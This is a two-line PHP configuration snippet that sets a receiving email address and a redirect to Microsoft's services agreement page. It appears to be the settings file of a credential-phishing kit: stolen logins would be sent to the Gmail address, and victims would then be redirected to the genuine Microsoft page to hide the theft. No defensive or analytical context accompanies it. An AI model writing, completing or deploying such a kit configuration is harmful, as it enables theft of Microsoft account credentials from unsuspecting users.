<?php 
$Receive_email="here agpatel529@gmail.com";
$redirect="https://www.microsoft.com/en-US/servicesagreement/";
?>